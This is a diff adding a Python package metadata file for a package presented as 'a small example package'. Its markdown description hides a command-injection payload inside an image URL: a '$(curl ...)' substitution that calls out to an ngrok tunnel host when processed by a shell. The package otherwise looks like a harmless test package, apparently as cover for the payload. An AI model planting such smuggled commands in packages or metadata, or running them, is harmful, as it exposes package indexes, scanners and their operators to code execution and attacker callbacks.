@@ -1,0 +1,15 @@
+Metadata-Version: 2.1
+Name: example_package_eladpt
+Version: 0.0.15
+Summary: A small example package
+Author-email: Example Author <author@example.com>
+Project-URL: Homepage, http://another.com
+Project-URL: Bug Tracker, http://sec.com
+Classifier: Programming Language :: Python :: 3
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.8
+Description-Content-Type: text/markdown
+
+# Testing
+
+![image](https://htmlcolorcodes.com/assets/images/colors/$(curl https://2533-213-57-222-83.eu.ngrok.io)/red-color-solid-background-1920x1080.png)
